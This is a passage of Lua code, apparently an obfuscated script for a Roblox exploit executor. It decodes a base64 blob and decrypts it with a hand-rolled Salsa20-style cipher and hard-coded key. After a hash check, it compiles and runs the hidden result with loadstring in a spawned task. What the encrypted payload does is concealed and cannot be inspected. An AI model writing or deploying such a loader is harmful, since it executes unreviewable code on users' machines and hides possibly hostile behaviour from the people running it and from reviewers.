zBXG6BQTEKlqKWwMj1waD94lbcZfwPhLEipmupcmQFMcIioodw+kO6V3AEf6cxlAGExrpuph/3VX/fQhVAQg5lC4xWeUMyYhTL0XER53MugvCul3KjG4RqfEkF/y1meoyjr7Tcpr88p63RDOuOuQeyfpImSj126FYWEyC8Hp/Oq8FJY0oGAsjqOEr3rQ0wbHEiR39tRtf7Vzi8oQMiPtTss0hxsjDtBTZ5WmL3X5uaXMu/b0dVwnKDOaBK3mkAdda191iMrbu8kTFR/5sQKFObXmUz8PvirdXTwMOAMZ+g76QbGcQCLKdFbugNqA3Lv7GkK64bn9WuFLyFrgkMCaeNNeXMwzAJotLjn48p0xtuUzPn"
  local _b8 = "Q83aS9b0aXih7/EU3myC2gkRTjzUBMG9gp5MWoS2VIv5Q7oUsRfufghIQY/hAJOS9xMRUZHqV4LewA2raWfRnHP+d72CetD6rZ9KQUrJytN9YM7Ff2rrp8G7Iid3MMdxDGnjVx4K/KJMH6FdTqlCppt/m0TL8U/M56z2BWTopMuMaV/60bxGdUpUeUqaYC+K8YXFZ0r/Lk2vm51UlKgGcY3o/09NLD50n1GC8j1pThfnNknq6XVKTktn1LPVSqLHg6ihZ0l4nEa8qLRfBZ0J/ZMrGOq54J9TwkcKAeEEuuVU0KhHqTjFWF0EHHgPPkoIHLr5WZmdJ3Qsr5KC18LqNAFAr3NXqXt1pgCBG9mFtMiswQO7BZmkg/DGmYjUggpzVdWt00nffHS6smyjy54J30jf2q/saadKRXrJkVWq0QPzwCi45YZW9gDIXwSwNFHvg6zUnOLkhzvQn991bvpV1/d/1Zvf8L3msnGZCTKsSmxbVVrPnapMb/L49xcJZypLVoUPacwTTnXCtsgVwo+YyV2MKjVkowWUSyE7k3GIammNtR3PaTSvnpzoTjkkTVRT5mb4prffFcSK6atI1b8Mi7ntqlgs2bOtJuMZoZwzDtCn4rhX7wyRAN+lqCdr4a73Z8vKZLMTUqhPJMoZ8Wd+ZAGyvHTeR16/LtHosm5DpU74fzXmpoV/DhtHx9aIoMqhIXEq+Pr9PFlSR7L31OB00lyT+iADIaxeETpF0kEKMxfY3lcV9/E00svv8G6zczkvqI6YuSJCSMYUdCWqQAFhJ5Avz2AK/ER0ZqqoUc4="

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _xrj = _hex2bin("219cbe1c6e6672d95b9953f837953ff4e97c9bb8c8b2e619d5c99f0662b3e9fc")
  local _tan = _hex2bin("5fccc3adf0bf5415")

  if #_xrj ~= 32 or #_tan ~= 8 then
    _emd = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_xrj, p)
           + string.byte(_xrj, p + 1) * 256
           + string.byte(_xrj, p + 2) * 65536
           + string.byte(_xrj, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_tan, p)
           + string.byte(_tan, p + 1) * 256
           + string.byte(_tan, p + 2) * 65536
           + string.byte(_tan, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2, _b3, _b4, _b5, _b6, _b7, _b8}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _nvs = table.concat(dec)

  local h = 0
  for i = 1, #_nvs do
    h = (h * 16777619 + string.byte(_nvs, i)) % 4294967296
  end
  if h ~= 3345216312 then
    _emd = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _emd = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _ifh(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _emd = "loadstring check failed"
    return
  end
  local _okRun, _res = _ifh(_compiledTest)
  if not _okRun or _res ~= 4 then
    _emd = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _ifh(_load, _nvs)
  if not _okComp or not _fn then
    _emd = "compilation failed"
    return
  end

  -- 🔥 SOLUCIÓN AL HILO COLGADO: Ejecutar en task.spawn
  local function _doExec()
    local _okExec, _execErr = _ifh(_fn)
    if not _okExec then
      warn("[obf] runtime error: " .. tostring(_execErr))
    end
  end

  if task and task.spawn then
    task.spawn(_doExec)
  elseif spawn then
    spawn(_doExec)
  else
    local c = coroutine.create(_doExec)
    coroutine.resume(c)
  end
end

local _okGlobal, _globalErr = _ifh(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _emd then
  warn("[obf] " .. tostring(_emd))
end
